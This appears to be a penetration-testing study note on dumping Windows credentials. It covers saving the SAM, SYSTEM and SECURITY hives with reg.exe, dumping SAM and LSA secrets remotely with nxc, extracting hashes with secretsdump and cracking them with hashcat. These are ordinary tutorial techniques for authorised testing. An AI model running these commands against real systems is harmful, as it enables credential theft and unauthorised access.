#SAM 
_Copying SAM Registry Hives_
There are three registry hives that we can copy if we have local admin access on the target; each will have a specific purpose when we get to dumping and cracking the hashes. Here is a brief description of each in the table below:

| Registry Hive   | Description                                                                                                                                                |
| --------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| _hklm\sam_      | Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext. |
| _hklm\system_   | Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.                              |
| _hklm\security_ | Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.                                        |
We can create backups of these hives using the _reg.exe_ utility.

_Local Dump_
We can copy this registry in a file like this:
```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

Technically we will only need _hklm\sam_ & _hklm\system_, but hklm\security can also be helpful to save as it can contain hashes associated with cached domain user account credentials present on domain-joined hosts. 

_Remote Dump_
With access to credentials with local admin privileges, it is also possible for us to target LSA Secrets over the network. This could allow us to extract credentials from a running service, scheduled task, or application that uses LSA secrets to store passwords.
**DUMPING SAM**
```bash
nxc smb <IP> --local-auth -u <USER> -p <PASS> --lsa
```

**DUMPING SAM**
```bash
nxc smb <IP> --local-auth -u <USER> -p <PASS> --sam
```

_Extract Hash_
Once the files have been moved to our machine we can extract the _hash_ whit #secretsdump.
```bash
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

_Crack Hash_
Now we can insert all target hash in a file and run #hashcat whit it.
```bash
sudo hashcat -m 1000 <FILE or HASH> /usr/share/wordlists/rockyou.txt
```